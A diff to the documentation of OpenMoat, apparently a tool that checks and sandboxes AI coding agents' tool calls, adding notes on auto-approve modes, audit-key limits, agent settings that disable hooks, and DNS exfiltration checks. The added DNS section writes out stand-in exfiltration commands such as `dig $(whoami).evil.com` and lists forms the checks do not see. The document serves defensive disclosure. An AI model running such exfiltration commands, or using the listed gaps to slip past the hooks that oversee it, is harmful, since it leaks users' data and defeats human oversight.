@@ -18,6 +18,14 @@ Each agent's gaps and the reasons are in
 
 - **A deferred call runs if your agent lets it.** In auto-approve modes
   (`--dangerously-skip-permissions`, Run Everything) only `deny` and `review` stop a call.
+  `unattended: review` in your policy holds those calls for review where the hook can see
+  the mode (Claude Code's `bypassPermissions` and `auto`, and `acceptEdits` for edits and
+  file commands; pi without a screen, Hermes Agent in YOLO mode, Antigravity CLI's
+  `always-proceed`; POLICY.md §5.4, ADR-102). It is off by default. In `auto` and
+  `acceptEdits` the review is Claude Code's prompt, so it holds only while someone answers
+  it; elsewhere it is a deny until you approve it. Cline's `--auto-approve`, OpenCode 2's `--auto`, Codex's approval policy
+  `never`, Gemini CLI's `--yolo` and GitHub Copilot CLI's `--allow-all-tools` are not
+  shown to the hook, so a deferred call still runs there; use `openmoat run`.
 - **Some agents cannot prompt.** Codex, OpenCode 1, goose, the Cline CLI (where the deny
   also ends Cline's run), Cursor's file tools, pi in print and JSON mode, and Hermes Agent
   in YOLO mode receive a `review` as a deny that says how to approve the call
@@ -132,7 +140,11 @@ Each agent's gaps and the reasons are in
   from an allowed command: the proxy checks the host, not what is sent inside HTTPS.
 - **A program that runs as you outside any sandbox** can change the policy and
   recompute the lock. Only the OS sandboxes stop that, so hook-only agents do not have
-  this protection.
+  this protection. The same goes for the audit log: such a program reads the audit key
+  (`~/.moat/audit.key`) as easily as it writes the log, so it can rewrite both; the key
+  stops only someone who can change the log but not read the key
+  ([ADR-101](adr/ADR-101-keyed-audit-chain.md)). On Windows the key file is guarded by
+  the state directory's access list, not by mode bits, as the other keys are.
 - **The check and the call are two moments.** OpenMoat decides on what the call names;
   a file or link that changes between the check and the command running, and hard
   links that already exist, are not seen. Inside `openmoat run` the OS sandbox still
@@ -266,6 +278,7 @@ rest of each agent's protection on each OS, with the runs that back them.
 | goose | blocks the call | blocks the call | 60 s | `disabledPlugins` in a `settings.json`, `enabled: false` under `plugins` in `config.yaml`, a project plugin named `openmoat`, or a `hooks.json` goose cannot read | no | [1](https://github.com/aaif-goose/goose/blob/v1.57.0/crates/goose/src/hooks/mod.rs) |
 | Antigravity CLI | blocks the call | not documented; assumed to run the call | 600 s | `enabled: false` on the entry (a project's `.agents/hooks.json` included), or deleting it | yes: times out | [1](https://antigravity.google/docs/hooks?tab=cli) [2](https://github.com/crocodile-labs/openmoat/actions/runs/43254846914) |
 | Qwen Code | runs the call | runs the call | 600 s | `disableAllHooks: true` in a settings file (whether a project's turns the person's hooks off was not verified, so OpenMoat assumes it does), `--safe-mode`, `--bare`, or deleting the entry | yes: cannot start, crashes or exits non-zero; times out | [1](https://qwenlm.github.io/qwen-code-docs/en/users/features/hooks/) [2](https://github.com/QwenLM/qwen-code/blob/main/packages/core/src/hooks/hookRunner.ts) [3](https://github.com/QwenLM/qwen-code/blob/main/packages/core/src/core/toolHookTriggers.ts) |
+| Crush | runs the call | runs the call | 600 s | deleting the entry: no setting turns hooks off, and the hooks of every configuration file are appended to one another | yes: cannot start, crashes or exits non-zero; times out | [1](https://github.com/charmbracelet/crush/blob/main/docs/hooks/README.md) [2](https://github.com/charmbracelet/crush/blob/main/internal/hooks/runner.go) |
 | Continue CLI | runs the call | runs the call | 600 s | always: the released Continue CLI fires no hook | yes: cannot start, crashes or exits non-zero; times out | [1](https://github.com/continuedev/continue/blob/main/extensions/cli/src/hooks/hookRunner.ts) |
 <!-- /generated -->
 - **Agent settings can turn hooks off.** Codex runs a new or changed hook only once you
@@ -312,6 +325,18 @@ rest of each agent's protection on each OS, with the runs that back them.
   usually runs.
 
 ## Limits of single checks
+
+- **DNS exfiltration is seen only in a name with a fixed domain.** A name a resolver or
+  client looks up that is built at run time is decided as the domain it ends in
+  (`dig $(whoami).evil.com` is denied for an unlisted domain, ADR-102). Not seen: a name
+  with nothing fixed after its last expansion (`dig "$DOMAIN"`, `dig $(cat host.txt)`); a
+  domain under a top-level domain OpenMoat does not know, which is not taken for a host; a
+  host assigned to a variable earlier and used whole (`H=x.evil.com; dig $H`); a lookup
+  made by code that builds the name (`python3 -c` with a computed name, a script, a
+  program). The OS layers decide those where they apply. `getent`, `drill`, `kdig`,
+  `delv` and `resolvectl` now name hosts as `dig` does, so a lookup of an internal name
+  under a known top-level domain (`getent hosts db.corp.internal`) is decided as a
+  connection to it and denied unless the policy allows that host.
 
 - **After an upgrade, a policy edit or a move to another project, a long session's
   first calls may be refused.** OpenMoat works out the session's taint from its earlier
